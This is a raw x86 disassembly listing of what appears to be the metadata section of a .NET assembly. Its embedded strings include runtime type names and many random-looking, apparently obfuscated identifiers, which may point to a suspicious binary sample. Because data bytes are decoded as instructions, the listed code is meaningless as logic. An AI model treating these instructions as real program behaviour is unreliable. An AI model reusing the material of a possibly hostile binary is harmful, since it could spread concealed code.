  406fd2:	4d                   	dec    %ebp
  406fd3:	12 01                	adc    (%ecx),%al
  406fd5:	08 09                	or     %cl,(%ecx)
  406fd7:	04 a5                	add    $0xa5,%al
  406fd9:	18 0b                	sbb    %cl,(%ebx)
  406fdb:	08 09                	or     %cl,(%ecx)
  406fdd:	04 bf                	add    $0xbf,%al
  406fdf:	0b 11                	or     (%ecx),%edx
  406fe1:	08 11                	or     %dl,(%ecx)
  406fe3:	04 d6                	add    $0xd6,%al
  406fe5:	0f 19 08             	nopl   (%eax)
  406fe8:	21 04 72             	and    %eax,(%edx,%esi,2)
  406feb:	0d 20 08 19 04       	or     $0x4190820,%eax
  406ff0:	6a 0e                	push   $0xe
  406ff2:	27                   	daa
  406ff3:	08 31                	or     %dh,(%ecx)
  406ff5:	04 2e                	add    $0x2e,%al
  406ff7:	10 30                	adc    %dh,(%eax)
  406ff9:	08 41 04             	or     %al,0x4(%ecx)
  406ffc:	93                   	xchg   %eax,%ebx
  406ffd:	1b 3a                	sbb    (%edx),%edi
  406fff:	08 2c 00             	or     %ch,(%eax,%eax,1)
  407002:	2e 10 6f 08          	adc    %ch,%cs:0x8(%edi)
  407006:	2c 00                	sub    $0x0,%al
  407008:	e0 20                	loopne 0x40702a
  40700a:	7b 08                	jnp    0x407014
  40700c:	34 00                	xor    $0x0,%al
  40700e:	02 0e                	add    (%esi),%cl
  407010:	93                   	xchg   %eax,%ebx
  407011:	08 c9                	or     %cl,%cl
  407013:	01 b4 25 84 00 61 04 	add    %esi,0x4610084(%ebp,%eiz,1)
  40701a:	37                   	aaa
  40701b:	1d 53 01 59 04       	sbb    $0x4590153,%eax
  407020:	37                   	aaa
  407021:	1d b1 08 69 04       	sbb    $0x46908b1,%eax
  407026:	ce                   	into
  407027:	1e                   	push   %ds
  407028:	b9 08 51 01 03       	mov    $0x3015108,%ecx
  40702d:	14 cd                	adc    $0xcd,%al
  40702f:	00 89 04 37 1d 53    	add    %cl,0x531d3704(%ecx)
  407035:	01 71 04             	add    %esi,0x4(%ecx)
  407038:	37                   	aaa
  407039:	1d 0e 00 91 04       	sbb    $0x491000e,%eax
  40703e:	b7 12                	mov    $0x12,%bh
  407040:	fa                   	cli
  407041:	02 91 04 54 12 fa    	add    -0x5edabfc(%ecx),%dl
  407047:	02 91 04 81 0d d2    	add    -0x2df27efc(%ecx),%dl
  40704d:	08 91 04 96 13 d9    	or     %dl,-0x26ec69fc(%ecx)
  407053:	08 91 04 d8 24 79    	or     %dl,0x7924d804(%ecx)
  407059:	01 91 04 7a 08 0e    	add    %edx,0xe087a04(%ecx)
  40705f:	00 91 04 5c 1d e0    	add    %dl,-0x1fe2a3fc(%ecx)
  407065:	08 79 04             	or     %bh,0x4(%ecx)
  407068:	37                   	aaa
  407069:	1d e6 08 91 04       	sbb    $0x49108e6,%eax
  40706e:	6c                   	insb   (%dx),%es:(%edi)
  40706f:	08 7f 01             	or     %bh,0x1(%edi)
  407072:	79 04                	jns    0x407078
  407074:	0a 16                	or     (%esi),%dl
  407076:	0e                   	push   %cs
  407077:	00 81 04 37 1d 79    	add    %al,0x791d3704(%ecx)
  40707d:	01 59 02             	add    %ebx,0x2(%ecx)
  407080:	bc 24 7f 01 b9       	mov    $0xb9017f24,%esp
  407085:	03 cf                	add    %edi,%ecx
  407087:	14 f2                	adc    $0xf2,%al
  407089:	08 b9 04 37 1d 53    	or     %bh,0x531d3704(%ecx)
  40708f:	01 91 04 73 08 79    	add    %edx,0x79087304(%ecx)
  407095:	01 91 04 4c 1d e0    	add    %edx,-0x1fe2b3fc(%ecx)
  40709b:	08 c1                	or     %al,%cl
  40709d:	04 46                	add    $0x46,%al
  40709f:	25 16 09 c9 04       	and    $0x4c90916,%eax
  4070a4:	37                   	aaa
  4070a5:	1d 0e 00 d1 04       	sbb    $0x4d1000e,%eax
  4070aa:	37                   	aaa
  4070ab:	1d 4f 09 08 00       	sbb    $0x8094f,%eax
  4070b0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4070b1:	00 cd                	add    %cl,%ch
  4070b3:	01 08                	add    %ecx,(%eax)
  4070b5:	00 a8 00 d2 01 08    	add    %ch,0x801d200(%eax)
  4070bb:	00 ac 00 d7 01 08 00 	add    %ch,0x801d7(%eax,%eax,1)
  4070c2:	b0 00                	mov    $0x0,%al
  4070c4:	dc 01                	faddl  (%ecx)
  4070c6:	08 00                	or     %al,(%eax)
  4070c8:	b4 00                	mov    $0x0,%ah
  4070ca:	e1 01                	loope  0x4070cd
  4070cc:	08 00                	or     %al,(%eax)
  4070ce:	b8 00 e6 01 08       	mov    $0x801e600,%eax
  4070d3:	00 bc 00 eb 01 08 00 	add    %bh,0x801eb(%eax,%eax,1)
  4070da:	c0 00 f0             	rolb   $0xf0,(%eax)
  4070dd:	01 08                	add    %ecx,(%eax)
  4070df:	00 c4                	add    %al,%ah
  4070e1:	00 f5                	add    %dh,%ch
  4070e3:	01 08                	add    %ecx,(%eax)
  4070e5:	00 c8                	add    %cl,%al
  4070e7:	00 fa                	add    %bh,%dl
  4070e9:	01 08                	add    %ecx,(%eax)
  4070eb:	00 cc                	add    %cl,%ah
  4070ed:	00 ff                	add    %bh,%bh
  4070ef:	01 08                	add    %ecx,(%eax)
  4070f1:	00 d0                	add    %dl,%al
  4070f3:	00 04 02             	add    %al,(%edx,%eax,1)
  4070f6:	09 00                	or     %eax,(%eax)
  4070f8:	d8 00                	fadds  (%eax)
  4070fa:	8e 02                	mov    (%edx),%es
  4070fc:	09 00                	or     %eax,(%eax)
  4070fe:	dc 00                	faddl  (%eax)
  407100:	d7                   	xlat   %ds:(%ebx)
  407101:	01 09                	add    %ecx,(%ecx)
  407103:	00 e0                	add    %ah,%al
  407105:	00 d2                	add    %dl,%dl
  407107:	01 08                	add    %ecx,(%eax)
  407109:	00 f4                	add    %dh,%ah
  40710b:	00 cf                	add    %cl,%bh
  40710d:	02 08                	add    (%eax),%cl
  40710f:	00 f8                	add    %bh,%al
  407111:	00 d4                	add    %dl,%ah
  407113:	02 08                	add    (%eax),%cl
  407115:	00 fc                	add    %bh,%ah
  407117:	00 d9                	add    %bl,%cl
  407119:	02 08                	add    (%eax),%cl
  40711b:	00 00                	add    %al,(%eax)
  40711d:	01 cf                	add    %ecx,%edi
  40711f:	02 2e                	add    (%esi),%ch
  407121:	00 2b                	add    %ch,(%ebx)
  407123:	00 ff                	add    %bh,%bh
  407125:	02 2e                	add    (%esi),%ch
  407127:	00 33                	add    %dh,(%ebx)
  407129:	00 08                	add    %cl,(%eax)
  40712b:	03 2e                	add    (%esi),%ebp
  40712d:	00 3b                	add    %bh,(%ebx)
  40712f:	00 2d 03 2e 00 43    	add    %ch,0x43002e03
  407135:	00 36                	add    %dh,(%esi)
  407137:	03 2e                	add    (%esi),%ebp
  407139:	00 4b 00             	add    %cl,0x0(%ebx)
  40713c:	36 03 2e             	add    %ss:(%esi),%ebp
  40713f:	00 53 00             	add    %dl,0x0(%ebx)
  407142:	36 03 2e             	add    %ss:(%esi),%ebp
  407145:	00 5b 00             	add    %bl,0x0(%ebx)
  407148:	36 03 2e             	add    %ss:(%esi),%ebp
  40714b:	00 63 00             	add    %ah,0x0(%ebx)
  40714e:	36 03 2e             	add    %ss:(%esi),%ebp
  407151:	00 6b 00             	add    %ch,0x0(%ebx)
  407154:	36 03 2e             	add    %ss:(%esi),%ebp
  407157:	00 73 00             	add    %dh,0x0(%ebx)
  40715a:	36 03 2e             	add    %ss:(%esi),%ebp
  40715d:	00 7b 00             	add    %bh,0x0(%ebx)
  407160:	36 03 2e             	add    %ss:(%esi),%ebp
  407163:	00 83 00 3c 03 2e    	add    %al,0x2e033c00(%ebx)
  407169:	00 8b 00 49 03 c0    	add    %cl,-0x3ffcb700(%ebx)
  40716f:	00 93 00 d2 01 e0    	add    %dl,-0x1ffe2e00(%ebx)
  407175:	00 93 00 d2 01 e3    	add    %dl,-0x1cfe2e00(%ebx)
  40717b:	00 9b 00 af 03 00    	add    %bl,0x3af00(%ebx)
  407181:	01 93 00 d2 01 20    	add    %edx,0x2001d200(%ebx)
  407187:	01 93 00 d2 01 40    	add    %edx,0x4001d200(%ebx)
  40718d:	01 93 00 d2 01 60    	add    %edx,0x6001d200(%ebx)
  407193:	01 93 00 d2 01 80    	add    %edx,-0x7ffe2e00(%ebx)
  407199:	01 93 00 d2 01 a0    	add    %edx,-0x5ffe2e00(%ebx)
  40719f:	01 93 00 d2 01 c0    	add    %edx,-0x3ffe2e00(%ebx)
  4071a5:	01 93 00 d2 01 e0    	add    %edx,-0x1ffe2e00(%ebx)
  4071ab:	01 93 00 d2 01 00    	add    %edx,0x1d200(%ebx)
  4071b1:	02 93 00 d2 01 20    	add    0x2001d200(%ebx),%dl
  4071b7:	02 93 00 d2 01 40    	add    0x4001d200(%ebx),%dl
  4071bd:	02 93 00 d2 01 41    	add    0x4101d200(%ebx),%dl
  4071c3:	02 93 00 d2 01 60    	add    0x6001d200(%ebx),%dl
  4071c9:	02 93 00 d2 01 61    	add    0x6101d200(%ebx),%dl
  4071cf:	02 93 00 d2 01 80    	add    -0x7ffe2e00(%ebx),%dl
  4071d5:	02 93 00 d2 01 81    	add    -0x7efe2e00(%ebx),%dl
  4071db:	02 93 00 d2 01 a0    	add    -0x5ffe2e00(%ebx),%dl
  4071e1:	02 93 00 d2 01 a1    	add    -0x5efe2e00(%ebx),%dl
  4071e7:	02 93 00 d2 01 c0    	add    -0x3ffe2e00(%ebx),%dl
  4071ed:	02 93 00 d2 01 c1    	add    -0x3efe2e00(%ebx),%dl
  4071f3:	02 93 00 d2 01 e0    	add    -0x1ffe2e00(%ebx),%dl
  4071f9:	02 93 00 d2 01 e1    	add    -0x1efe2e00(%ebx),%dl
  4071ff:	02 93 00 d2 01 e3    	add    -0x1cfe2e00(%ebx),%dl
  407205:	02 93 00 d2 01 00    	add    0x1d200(%ebx),%dl
  40720b:	03 93 00 d2 01 01    	add    0x101d200(%ebx),%edx
  407211:	03 93 00 d2 01 21    	add    0x2101d200(%ebx),%edx
  407217:	03 93 00 d2 01 41    	add    0x4101d200(%ebx),%edx
  40721d:	03 93 00 d2 01 61    	add    0x6101d200(%ebx),%edx
  407223:	03 93 00 d2 01 63    	add    0x6301d200(%ebx),%edx
  407229:	03 93 00 d2 01 01    	add    0x101d200(%ebx),%edx
  40722f:	00 06                	add    %al,(%esi)
  407231:	00 00                	add    %al,(%eax)
  407233:	00 1c 00             	add    %bl,(%eax,%eax,1)
  407236:	01 00                	add    %eax,(%eax)
  407238:	20 00                	and    %al,(%eax)
  40723a:	00 00                	add    %al,(%eax)
  40723c:	1d 00 b9 03 c8       	sbb    $0xc803b900,%eax
  407241:	03 f3                	add    %ebx,%esi
  407243:	03 8f 04 b5 04 df    	add    -0x20fb4afc(%edi),%ecx
  407249:	04 f6                	add    $0xf6,%al
  40724b:	04 0a                	add    $0xa,%al
  40724d:	05 15 05 3b 05       	add    $0x53b0515,%eax
  407252:	48                   	dec    %eax
  407253:	05 8d 05 9e 05       	add    $0x59e058d,%eax
  407258:	bc 05 d2 05 d8       	mov    $0xd805d205,%esp
  40725d:	05 0f 06 19 06       	add    $0x619060f,%eax
  407262:	1f                   	pop    %ds
  407263:	06                   	push   %es
  407264:	24 06                	and    $0x6,%al
  407266:	2a 06                	sub    (%esi),%al
  407268:	33 06                	xor    (%esi),%eax
  40726a:	40                   	inc    %eax
  40726b:	06                   	push   %es
  40726c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40726d:	06                   	push   %es
  40726e:	ab                   	stos   %eax,%es:(%edi)
  40726f:	06                   	push   %es
  407270:	d3 06                	roll   %cl,(%esi)
  407272:	dc 06                	faddl  (%esi)
  407274:	e1 06                	loope  0x40727c
  407276:	eb 06                	jmp    0x40727e
  407278:	16                   	push   %ss
  407279:	07                   	pop    %es
  40727a:	26 07                	es pop %es
  40727c:	38 07                	cmp    %al,(%edi)
  40727e:	5f                   	pop    %edi
  40727f:	07                   	pop    %es
  407280:	84 07                	test   %al,(%edi)
  407282:	b2 07                	mov    $0x7,%dl
  407284:	c2 07 d8             	ret    $0xd807
  407287:	07                   	pop    %es
  407288:	07                   	pop    %es
  407289:	08 ab 08 bf 08 fb    	or     %ch,-0x4f740f8(%ebx)
  40728f:	08 23                	or     %ah,(%ebx)
  407291:	09 28                	or     %ebp,(%eax)
  407293:	09 37                	or     %esi,(%edi)
  407295:	09 3f                	or     %edi,(%edi)
  407297:	09 58 09             	or     %ebx,0x9(%eax)
  40729a:	04 00                	add    $0x0,%al
  40729c:	01 00                	add    %eax,(%eax)
  40729e:	06                   	push   %es
  40729f:	00 0b                	add    %cl,(%ebx)
  4072a1:	00 07                	add    %al,(%edi)
  4072a3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4072a6:	08 00                	or     %al,(%eax)
  4072a8:	0e                   	push   %cs
  4072a9:	00 00                	add    %al,(%eax)
  4072ab:	00 45 08             	add    %al,0x8(%ebp)
  4072ae:	9f                   	lahf
  4072af:	00 00                	add    %al,(%eax)
  4072b1:	00 86 06 a4 00 00    	add    %al,0xa406(%esi)
  4072b7:	00 46 16             	add    %al,0x16(%esi)
  4072ba:	a9 00 00 00 3f       	test   $0x3f000000,%eax
  4072bf:	07                   	pop    %es
  4072c0:	ae                   	scas   %es:(%edi),%al
  4072c1:	00 00                	add    %al,(%eax)
  4072c3:	00 b0 14 ae 00 00    	add    %dh,0xae14(%eax)
  4072c9:	00 16                	add    %dl,(%esi)
  4072cb:	05 b2 00 00 00       	add    $0xb2,%eax
  4072d0:	02 1b                	add    (%ebx),%bl
  4072d2:	b7 00                	mov    $0x0,%bh
  4072d4:	00 00                	add    %al,(%eax)
  4072d6:	de 0a                	fimuls (%edx)
  4072d8:	bb 00 00 00 a5       	mov    $0xa5000000,%ebx
  4072dd:	1d b2 00 00 00       	sbb    $0xb2,%eax
  4072e2:	37                   	aaa
  4072e3:	04 bf                	add    $0xbf,%al
  4072e5:	00 00                	add    %al,(%eax)
  4072e7:	00 74 02 0c          	add    %dh,0xc(%edx,%eax,1)
  4072eb:	01 00                	add    %eax,(%eax)
  4072ed:	00 21                	add    %ah,(%ecx)
  4072ef:	08 41 01             	or     %al,0x1(%ecx)
  4072f2:	00 00                	add    %al,(%eax)
  4072f4:	b2 1d                	mov    $0x1d,%dl
  4072f6:	47                   	inc    %edi
  4072f7:	01 00                	add    %eax,(%eax)
  4072f9:	00 15 13 b7 01 00    	add    %dl,0x1b713
  4072ff:	00 59 02             	add    %bl,0x2(%ecx)
  407302:	bb 01 00 00 d4       	mov    $0xd4000001,%ebx
  407307:	04 bf                	add    $0xbf,%al
  407309:	01 00                	add    %eax,(%eax)
  40730b:	00 c3                	add    %al,%bl
  40730d:	12 c3                	adc    %bl,%al
  40730f:	01 00                	add    %eax,(%eax)
  407311:	00 19                	add    %bl,(%ecx)
  407313:	09 c8                	or     %ecx,%eax
  407315:	01 02                	add    %eax,(%edx)
  407317:	00 06                	add    %al,(%esi)
  407319:	00 03                	add    %al,(%ebx)
  40731b:	00 01                	add    %al,(%ecx)
  40731d:	00 07                	add    %al,(%edi)
  40731f:	00 03                	add    %al,(%ebx)
  407321:	00 02                	add    %al,(%edx)
  407323:	00 08                	add    %cl,(%eax)
  407325:	00 05 00 01 00 09    	add    %al,0x9000100
  40732b:	00 05 00 02 00 0a    	add    %al,0xa000200
  407331:	00 07                	add    %al,(%edi)
  407333:	00 01                	add    %al,(%ecx)
  407335:	00 0b                	add    %cl,(%ebx)
  407337:	00 07                	add    %al,(%edi)
  407339:	00 02                	add    %al,(%edx)
  40733b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40733e:	09 00                	or     %eax,(%eax)
  407340:	01 00                	add    %eax,(%eax)
  407342:	0d 00 09 00 02       	or     $0x2000900,%eax
  407347:	00 0e                	add    %cl,(%esi)
  407349:	00 0b                	add    %cl,(%ebx)
  40734b:	00 01                	add    %al,(%ecx)
  40734d:	00 0f                	add    %cl,(%edi)
  40734f:	00 0b                	add    %cl,(%ebx)
  407351:	00 02                	add    %al,(%edx)
  407353:	00 10                	add    %dl,(%eax)
  407355:	00 0d 00 01 00 11    	add    %cl,0x11000100
  40735b:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407361:	00 0f                	add    %cl,(%edi)
  407363:	00 01                	add    %al,(%ecx)
  407365:	00 13                	add    %dl,(%ebx)
  407367:	00 0f                	add    %cl,(%edi)
  407369:	00 02                	add    %al,(%edx)
  40736b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40736e:	11 00                	adc    %eax,(%eax)
  407370:	02 00                	add    (%eax),%al
  407372:	15 00 13 00 01       	adc    $0x1001300,%eax
  407377:	00 16                	add    %dl,(%esi)
  407379:	00 13                	add    %dl,(%ebx)
  40737b:	00 02                	add    %al,(%edx)
  40737d:	00 17                	add    %dl,(%edi)
  40737f:	00 15 00 01 00 18    	add    %dl,0x18000100
  407385:	00 15 00 02 00 2e    	add    %dl,0x2e000200
  40738b:	00 17                	add    %dl,(%edi)
  40738d:	00 02                	add    %al,(%edx)
  40738f:	00 36                	add    %dh,(%esi)
  407391:	00 19                	add    %bl,(%ecx)
  407393:	00 02                	add    %al,(%edx)
  407395:	00 37                	add    %dh,(%edi)
  407397:	00 1b                	add    %bl,(%ebx)
  407399:	00 02                	add    %al,(%edx)
  40739b:	00 59 00             	add    %bl,0x0(%ecx)
  40739e:	1d 00 01 00 5a       	sbb    $0x5a000100,%eax
  4073a3:	00 1d 00 02 00 5b    	add    %bl,0x5b000200
  4073a9:	00 1f                	add    %bl,(%edi)
  4073ab:	00 01                	add    %al,(%ecx)
  4073ad:	00 5c 00 1f          	add    %bl,0x1f(%eax,%eax,1)
  4073b1:	00 02                	add    %al,(%edx)
  4073b3:	00 5d 00             	add    %bl,0x0(%ebp)
  4073b6:	21 00                	and    %eax,(%eax)
  4073b8:	01 00                	add    %eax,(%eax)
  4073ba:	5e                   	pop    %esi
  4073bb:	00 21                	add    %ah,(%ecx)
  4073bd:	00 02                	add    %al,(%edx)
  4073bf:	00 5f 00             	add    %bl,0x0(%edi)
  4073c2:	23 00                	and    (%eax),%eax
  4073c4:	02 00                	add    (%eax),%al
  4073c6:	60                   	pusha
  4073c7:	00 25 00 06 00 5c    	add    %ah,0x5c000600
  4073cd:	00 03                	add    %al,(%ebx)
  4073cf:	00 06                	add    %al,(%esi)
  4073d1:	00 5e 00             	add    %bl,0x0(%esi)
  4073d4:	05 00 06 00 60       	add    $0x60000600,%eax
  4073d9:	00 07                	add    %al,(%edi)
  4073db:	00 08                	add    %cl,(%eax)
  4073dd:	00 c2                	add    %al,%dl
  4073df:	00 09                	add    %cl,(%ecx)
  4073e1:	00 0d 17 1a 17 fd    	add    %cl,0xfd171a17
  4073e7:	04 2e                	add    $0x2e,%al
  4073e9:	05 9b 05 71 07       	add    $0x771059b,%eax
  4073ee:	57                   	push   %edi
  4073ef:	08 7f 08             	or     %bh,0x8(%edi)
  4073f2:	00 01                	add    %al,(%ecx)
  4073f4:	f1                   	int1
  4073f5:	00 48 0e             	add    %cl,0xe(%eax)
  4073f8:	01 00                	add    %eax,(%eax)
  4073fa:	41                   	inc    %ecx
  4073fb:	01 f3                	add    %esi,%ebx
  4073fd:	00 0d 22 01 00 40    	add    %cl,0x40000122
  407403:	01 0b                	add    %ecx,(%ebx)
  407405:	01 35 10 01 00 40    	add    %esi,0x40000110
  40740b:	01 19                	add    %ebx,(%ecx)
  40740d:	01 8e 16 02 00 50    	add    %ecx,0x50000216(%esi)
  407413:	20 00                	and    %al,(%eax)
  407415:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  407419:	20 00                	and    %al,(%eax)
  40741b:	00 45 00             	add    %al,0x0(%ebp)
  40741e:	04 80                	add    $0x80,%al
  407420:	00 00                	add    %al,(%eax)
  407422:	01 00                	add    %eax,(%eax)
	...
  407430:	ca 0a 00             	lret   $0xa
  407433:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40743e:	00 00                	add    %al,(%eax)
  407440:	01 00                	add    %eax,(%eax)
  407442:	c1 0a 00             	rorl   $0x0,(%edx)
  407445:	00 00                	add    %al,(%eax)
  407447:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407452:	00 00                	add    %al,(%eax)
  407454:	01 00                	add    %eax,(%eax)
  407456:	a2 17 00 00 00       	mov    %al,0x17
  40745b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407466:	00 00                	add    %al,(%eax)
  407468:	70 02                	jo     0x40746c
  40746a:	58                   	pop    %eax
  40746b:	14 00                	adc    $0x0,%al
  40746d:	00 00                	add    %al,(%eax)
  40746f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40747a:	00 00                	add    %al,(%eax)
  40747c:	01 00                	add    %eax,(%eax)
  40747e:	f3 0f 00 00          	repz sldt (%eax)
  407482:	00 00                	add    %al,(%eax)
  407484:	0a 00                	or     (%eax),%al
	...
  40748e:	00 00                	add    %al,(%eax)
  407490:	70 02                	jo     0x407494
  407492:	18 0b                	sbb    %cl,(%ebx)
  407494:	00 00                	add    %al,(%eax)
  407496:	00 00                	add    %al,(%eax)
  407498:	04 00                	add    $0x0,%al
	...
  4074a2:	00 00                	add    %al,(%eax)
  4074a4:	70 02                	jo     0x4074a8
  4074a6:	b9 21 00 00 00       	mov    $0x21,%ecx
  4074ab:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4074b6:	00 00                	add    %al,(%eax)
  4074b8:	01 00                	add    %eax,(%eax)
  4074ba:	69 1f 00 00 00 00    	imul   $0x0,(%edi),%ebx
  4074c0:	04 00                	add    $0x0,%al
	...
  4074ca:	00 00                	add    %al,(%eax)
  4074cc:	70 02                	jo     0x4074d0
  4074ce:	0f 1b 00             	bndstx %bnd0,(%eax)
  4074d1:	00 00                	add    %al,(%eax)
  4074d3:	00 12                	add    %dl,(%edx)
  4074d5:	00 11                	add    %dl,(%ecx)
  4074d7:	00 17                	add    %dl,(%edi)
  4074d9:	00 16                	add    %dl,(%esi)
  4074db:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4074de:	1b 00                	sbb    (%eax),%eax
  4074e0:	1d 00 1b 00 79       	sbb    $0x79001b00,%eax
  4074e5:	01 03                	add    %eax,(%ebx)
  4074e7:	07                   	pop    %es
  4074e8:	7b 01                	jnp    0x4074eb
  4074ea:	03 07                	add    (%edi),%eax
  4074ec:	d7                   	xlat   %ds:(%ebx)
  4074ed:	01 fc                	add    %edi,%esp
  4074ef:	07                   	pop    %es
  4074f0:	00 41 63             	add    %al,0x63(%ecx)
  4074f3:	74 69                	je     0x40755e
  4074f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4074f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4074f7:	60                   	pusha
  4074f8:	31 30                	xor    %esi,(%eax)
  4074fa:	00 49 45             	add    %cl,0x45(%ecx)
  4074fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4074fe:	75 6d                	jne    0x40756d
  407500:	65 72 61             	gs jb  0x407564
  407503:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407507:	31 00                	xor    %eax,(%eax)
  407509:	43                   	inc    %ebx
  40750a:	61                   	popa
  40750b:	6c                   	insb   (%dx),%es:(%edi)
  40750c:	6c                   	insb   (%dx),%es:(%edi)
  40750d:	53                   	push   %ebx
  40750e:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407515:	69 
  407516:	73 74                	jae    0x40758c
  407518:	60                   	pusha
  407519:	31 00                	xor    %eax,(%eax)
  40751b:	4d                   	dec    %ebp
  40751c:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407523:	74 2e                	je     0x407553
  407525:	57                   	push   %edi
  407526:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40752d:	55                   	push   %ebp
  40752e:	49                   	dec    %ecx
  40752f:	6e                   	outsb  %ds:(%esi),(%dx)
  407530:	74 33                	je     0x407565
  407532:	32 00                	xor    (%eax),%al
  407534:	54                   	push   %esp
  407535:	6f                   	outsl  %ds:(%esi),(%dx)
  407536:	49                   	dec    %ecx
  407537:	6e                   	outsb  %ds:(%esi),(%dx)
  407538:	74 33                	je     0x40756d
  40753a:	32 00                	xor    (%eax),%al
  40753c:	58                   	pop    %eax
  40753d:	35 30 39 43 65       	xor    $0x65433930,%eax
  407542:	72 74                	jb     0x4075b8
  407544:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40754b:	32 00                	xor    (%eax),%al
  40754d:	54                   	push   %esp
  40754e:	6f                   	outsl  %ds:(%esi),(%dx)
  40754f:	55                   	push   %ebp
  407550:	49                   	dec    %ecx
  407551:	6e                   	outsb  %ds:(%esi),(%dx)
  407552:	74 36                	je     0x40758a
  407554:	34 00                	xor    $0x0,%al
  407556:	54                   	push   %esp
  407557:	6f                   	outsl  %ds:(%esi),(%dx)
  407558:	49                   	dec    %ecx
  407559:	6e                   	outsb  %ds:(%esi),(%dx)
  40755a:	74 36                	je     0x407592
  40755c:	34 00                	xor    $0x0,%al
  40755e:	54                   	push   %esp
  40755f:	6f                   	outsl  %ds:(%esi),(%dx)
  407560:	55                   	push   %ebp
  407561:	49                   	dec    %ecx
  407562:	6e                   	outsb  %ds:(%esi),(%dx)
  407563:	74 31                	je     0x407596
  407565:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40756a:	6e                   	outsb  %ds:(%esi),(%dx)
  40756b:	74 31                	je     0x40759e
  40756d:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407571:	41                   	inc    %ecx
  407572:	43                   	inc    %ebx
  407573:	53                   	push   %ebx
  407574:	48                   	dec    %eax
  407575:	41                   	inc    %ecx
  407576:	32 35 36 00 67 65    	xor    0x65670036,%dh
  40757c:	74 5f                	je     0x4075dd
  40757e:	55                   	push   %ebp
  40757f:	54                   	push   %esp
  407580:	46                   	inc    %esi
  407581:	38 00                	cmp    %al,(%eax)
  407583:	3c 4d                	cmp    $0x4d,%al
  407585:	6f                   	outsl  %ds:(%esi),(%dx)
  407586:	64 75 6c             	fs jne 0x4075f5
  407589:	65 3e 00 75 48       	gs add %dh,%ds:0x48(%ebp)
  40758e:	68 72 62 42 49       	push   $0x49426272
  407593:	6f                   	outsl  %ds:(%esi),(%dx)
  407594:	71 64                	jno    0x4075fa
  407596:	41                   	inc    %ecx
  407597:	00 48 47             	add    %cl,0x47(%eax)
  40759a:	54                   	push   %esp
  40759b:	67 7a 75             	addr16 jp 0x407613
  40759e:	63 6b 59             	arpl   %ebp,0x59(%ebx)
  4075a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4075a2:	41                   	inc    %ecx
  4075a3:	00 59 55             	add    %bl,0x55(%ecx)
  4075a6:	6b 42 46 62          	imul   $0x62,0x46(%edx),%eax
  4075aa:	45                   	inc    %ebp
  4075ab:	68 63 72 41 00       	push   $0x417263
  4075b0:	61                   	popa
  4075b1:	7a 42                	jp     0x4075f5
  4075b3:	4d                   	dec    %ebp
  4075b4:	62 53 45             	bound  %edx,0x45(%ebx)
  4075b7:	73 4e                	jae    0x407607
  4075b9:	78 5a                	js     0x407615
  4075bb:	78 41                	js     0x4075fe
  4075bd:	00 73 4f             	add    %dh,0x4f(%ebx)
  4075c0:	50                   	push   %eax
  4075c1:	63 77 4e             	arpl   %esi,0x4e(%edi)
  4075c4:	66 6c                	data16 insb (%dx),%es:(%edi)
  4075c6:	45                   	inc    %ebp
  4075c7:	58                   	pop    %eax
  4075c8:	41                   	inc    %ecx
  4075c9:	42                   	inc    %edx
  4075ca:	00 52 51             	add    %dl,0x51(%edx)
  4075cd:	76 50                	jbe    0x40761f
  4075cf:	6c                   	insb   (%dx),%es:(%edi)
  4075d0:	78 47                	js     0x407619
  4075d2:	48                   	dec    %eax
  4075d3:	49                   	dec    %ecx
  4075d4:	67 43                	addr16 inc %ebx
  4075d6:	42                   	inc    %edx
  4075d7:	00 71 75             	add    %dh,0x75(%ecx)
  4075da:	67 54                	addr16 push %esp
  4075dc:	61                   	popa
  4075dd:	5a                   	pop    %edx
  4075de:	68 71 72 45 42       	push   $0x42457271
  4075e3:	00 76 78             	add    %dh,0x78(%esi)
  4075e6:	6c                   	insb   (%dx),%es:(%edi)
  4075e7:	4d                   	dec    %ebp
  4075e8:	45                   	inc    %ebp
  4075e9:	4a                   	dec    %edx
  4075ea:	61                   	popa
  4075eb:	4a                   	dec    %edx
  4075ec:	6b 58 4b 42          	imul   $0x42,0x4b(%eax),%ebx
  4075f0:	00 5a 6c             	add    %bl,0x6c(%edx)
  4075f3:	63 6c 75 46          	arpl   %ebp,0x46(%ebp,%esi,2)
  4075f7:	65 6b 54 47 79 51    	imul   $0x51,%gs:0x79(%edi,%eax,2),%edx
  4075fd:	42                   	inc    %edx
  4075fe:	00 55 79             	add    %dl,0x79(%ebp)
  407601:	50                   	push   %eax
  407602:	6a 44                	push   $0x44
  407604:	6a 43                	push   $0x43
  407606:	6c                   	insb   (%dx),%es:(%edi)
  407607:	47                   	inc    %edi
  407608:	5a                   	pop    %edx
  407609:	69 6c 53 61 42 00 61 	imul   $0x62610042,0x61(%ebx,%edx,2),%ebp
  407610:	62 
  407611:	50                   	push   %eax
  407612:	50                   	push   %eax
  407613:	61                   	popa
  407614:	68 71 52 71 4a       	push   $0x4a715271
  407619:	50                   	push   %eax
  40761a:	74 74                	je     0x407690
  40761c:	4e                   	dec    %esi
  40761d:	72 42                	jb     0x407661
  40761f:	00 78 5a             	add    %bh,0x5a(%eax)
  407622:	6c                   	insb   (%dx),%es:(%edi)
  407623:	4c                   	dec    %esp
